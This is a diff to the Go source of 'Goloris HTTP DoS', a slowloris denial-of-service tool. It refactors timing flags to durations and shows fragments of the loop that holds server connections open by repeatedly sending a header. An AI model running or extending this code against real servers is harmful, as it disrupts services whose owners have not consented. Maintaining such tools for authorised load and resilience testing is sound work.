@@ -17,18 +17,17 @@ const (
 	defaultUserAgent = "Goloris HTTP DoS"
 	defaultDOSHeader = "Cookie: a=b"
 	legalDisclaimer  = `Usage of this program for attacking targets without prior mutual consent is
-illegal. It is the end user's responsibility to obey all applicable local, 
-state and federal laws. Developers assume no liability and are not 
+illegal. It is the end user's responsibility to obey all applicable local,
+state and federal laws. Developers assume no liability and are not
 responsible for any misuse or damage caused by this program.
-
 This disclaimer was shamelessy copied from sqlmap with minor modifications :)
     `
 )
 
 type options struct {
 	numConnections int
-	interval       int
-	timeout        int
+	interval       time.Duration
+	timeout        time.Duration
 	method         string
 	resource       string
 	userAgent      string
@@ -36,7 +35,7 @@ type options struct {
 	https          bool
 	dosHeader      string
 	timermode      bool
-	finishAfter    int
+	finishAfter    time.Duration
 }
 
 func main() {
@@ -44,15 +43,15 @@ func main() {
 
 	flag.Usage = usage
 	flag.IntVar(&opts.numConnections, "connections", 10, "Number of active concurrent connections")
-	flag.IntVar(&opts.interval, "interval", 1, "Number of seconds to wait between sending headers")
-	flag.IntVar(&opts.timeout, "timeout", 60, "HTTP connection timeout in seconds")
+	flag.DurationVar(&opts.interval, "interval", 1*time.Second, "Duration to wait between sending headers")
+	flag.DurationVar(&opts.timeout, "timeout", 60*time.Second, "HTTP connection timeout in seconds")
 	flag.StringVar(&opts.method, "method", "GET", "HTTP method to use")
 	flag.StringVar(&opts.resource, "resource", "/", "Resource to request from the server")
 	flag.StringVar(&opts.userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
 	flag.StringVar(&opts.dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
 	flag.BoolVar(&opts.https, "https", false, "Use HTTPS")
 	flag.BoolVar(&opts.timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
-	flag.IntVar(&opts.finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
+	flag.DurationVar(&opts.finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
 	flag.Parse()
 
 	if len(flag.Args()) == 0 {
@@ -138,8 +137,8 @@ func slowloris(opts options) {
 
 	var timerChan <-chan time.Time
 	var timer *time.Timer
-	if opts.finishAfter > 0 {
-		timer = time.NewTimer(time.Duration(opts.finishAfter) * time.Second)
+	if opts.finishAfter != 0 {
+		timer = time.NewTimer(opts.finishAfter)
 		timerChan = timer.C
 	}
 
@@ -165,9 +164,9 @@ loop:
 
 		for {
 			select {
-			case <-time.After(time.Duration(opts.interval) * time.Second):
+			case <-time.After(opts.interval):
 				if timer != nil {
-					timer.Reset(time.Duration(opts.finishAfter) * time.Second)
+					timer.Reset(opts.finishAfter)
 				}
 				if _, err := fmt.Fprintf(conn, "%s\r\n", opts.dosHeader); err != nil {
 					continue loop
@@ -188,7 +187,7 @@ loop:
 func openConnection(opts options) (net.Conn, error) {
 	var conn net.Conn
 	var err error
-	timeoutDuration := time.Duration(opts.timeout) * time.Second
+	timeoutDuration := opts.timeout
 
 	if opts.https {
 		config := &tls.Config{InsecureSkipVerify: true}
